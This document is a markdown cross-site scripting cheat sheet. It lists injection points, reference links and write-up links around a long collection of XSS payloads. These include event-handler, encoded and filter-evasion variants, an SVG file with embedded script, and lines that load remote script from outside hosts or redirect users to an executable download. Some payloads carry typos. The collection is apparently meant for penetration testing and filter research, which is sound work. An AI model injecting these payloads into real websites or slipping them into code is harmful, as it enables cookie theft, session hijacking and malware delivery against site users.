```perl
Search Bar
User Agent
Cookie
Local Storage
Regex Filter
Name Page or any input field
```


```python
https://owasp.org/www-community/attacks/xss/
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md
https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html
https://xsshunter.com/app
https://github.com/hakluke/weaponised-XSS-payloads
https://www.volkis.com.au/blog/bypass-xss-in-wafs/
https://tweetedtimes.com/v/1939
```

```css
"><svg onload=alert(1)>
#"><img src=/ onerror=alert(document.cookie)>
<img src=1 onerror=alert(1)>

javascript:alert(document.cookie)
storeId=</option></select><script>alert(1)</script>

<iframe src="https://0a2300c8047be35ac091f21a00f8009b.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

"onmouseover="alert(1)
" onfocus=alert(1) autofocus foo="
javascript:alert(1)

```

# Payloads
```python
"><svg onload=alert(document.cookie)>

"><svg onload=alert(document.domain)>

"><img src="x" onerror="alert(document.cookie)">

"><img src=x onerror=aler(document.cookie)>

"><img src=x onerror=alert(1)>

"><img src=x onerror=prompt(document.domain)>

"><img src="x" onerror='alert(1)'>

"><svg/onload-alert(document.cookie)>

"><iframe src=javascript:prompt(document.cookie)>

tes/><iframe src-javascript:prompt(document.cookie)>

"><iframe src=javascript:prompt(1)>

"><svg onload=alert(1)>

"><img src=x onerror="alert(1)">

}}})</script><script>alert(1)</script>

<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>

<svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>

<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>

<svg><script%20?>confirm(1)

?msg=<img/src=`%00`%20onerror=this.onerror=confirm(1)

?msg=<script>alert(1)</script>
?msg=<img src=xss onerror=alert(1)>
?msg=<input/onmouseover=”javaSCRIPT&colon;confirm&lpar;1&rpar;”
?msg=<iframe %00 src=”&Tab;javascript:prompt(1)&Tab;”%00>
?msg=<h1>Hello World</h1>

'+</ScripT><ScRIpT>prompt(document.domain)</scRIpT>+'

\"><iframe/src=javascript:alert&#x000000028;)>

<iframe/srcdoc=”<script/src=//narayananm.xss.ht></script>”>

<html><head><script src="//narayananm.xss.ht"></script></head><body></body></html>

batman"></form><div class="inner product-tab"><h3><jAvAsCrIpT: onclick=location=tagName BinnerHTML Blocation.hash>/*click me!#*/alert(1)
batman"></form><div%20class="inner%20product-tab"><h3><jAvAsCrIpT:%20onclick=location=tagName%20BinnerHTML%20Blocation.hash>/*click%20me!#*/alert(1)

"filename":"synack'\"><title></textarea></script></style></noscript><script src=https://abc.xss.ht></script>.jpg"

<svg/On/OnLoAd=confirm(1)>
"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>

<h1>Vulnmachines</h1>

<img src="x:gif" onerror="window['al\u0065rt'] (0)"></img>
“><script>alert(document.cookie)</script>
<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a"); AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3cscript%3ealert(document.cookie)%3c/script%3e
<body onload=alert('test1')>
<scr<script>ipt>alert(document.cookie)</script>

<?
    $re = "/<script[^>]+src/i";
    if (preg_match($re, $_GET['var']))
    {
        echo "Filtered";
        return;
    }
    echo "Welcome ".$_GET['var']." !";
?>

<script [anything but the character: '>'] src
<script src="http://attacker/xss.js"></script>
http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
http://example/page.php?param=<script&param=>[...]</&param=script>
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14; javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//\<</SCRIPT>
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
<SCRIPT SRC=//xss.rocks/.j>
/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/
<IMG SRC="('XSS')"
<iframe src=http://xss.rocks/scriptlet.html <
<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>
<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>
\";alert('XSS');//
</script><script>alert('XSS');</script>

End Title Tag
</TITLE><SCRIPT>alert("XSS");</SCRIPT>

INPUT Image
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">

BODY Image
<BODY BACKGROUND="javascript:alert('XSS')">

IMG Dynsrc
<IMG DYNSRC="javascript:alert('XSS')">

IMG Lowsrc
<IMG LOWSRC="javascript:alert('XSS')">

List-style-image
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>

VBscript in an Image
<IMG SRC='vbscript:msgbox("XSS")'>

Livescript (older versions of Netscape only)
<IMG SRC="livescript:[code]">

SVG Object Tag
<svg/onload=alert('XSS')>

ECMAScript 6
Set.constructor`alert\x28document.domain\x29

BODY Tag
<BODY ONLOAD=alert('XSS')>

BGSOUND
<BGSOUND SRC="javascript:alert('XSS');">

JavaScript includes
<BR SIZE="&{alert('XSS')}">

STYLE sheet
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">

<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">

exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>

<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> <STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾

IFRAME
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

IFRAME Event Based
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>

FRAME
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>

TABLE
<TABLE BACKGROUND="javascript:alert('XSS')">

TD
<TABLE><TD BACKGROUND="javascript:alert('XSS')">

DIV Background-image
<DIV STYLE="background-image: url(javascript:alert('XSS'))">


<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>

Using ActionScript Inside Flash for Obfuscation
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")"; 
eval(a+b+c+d);

<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> 
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>

<XML SRC="xsstest.xml" ID=I></XML>  
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->

<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>

Cookie Manipulation
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">

/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
<SCRIPT a=>SRC="httx://xss.rocks/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
shirley"><img src=x onerror=alert(document.domain)>//shirley

```

svg file upload
```css
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert("xss");
   </script>
</svg>
```

Write-ups
```
https://infosecwriteups.com/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1
https://medium.com/@ao64400225/an-unusual-way-to-find-xss-injection-in-one-minute-9ed2c7e2a848
https://c0ff33b34n.medium.com/simple-dom-xss-trick-c9b29364477c
https://c0nqr0r.medium.com/reading-robots-txt-got-me-4-xss-reports-9fd2234c635f
https://brutelogic.com.br/blog/file-upload-xss/
https://hackr.io/blog/xss-cheat-sheet
https://brutelogic.com.br/blog/xss-with-hoisting/
https://hackerone.com/reports/1010466
https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209
https://infosecwriteups.com/blind-xss-for-beginners-c88e48083071
https://infosecwriteups.com/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8

```
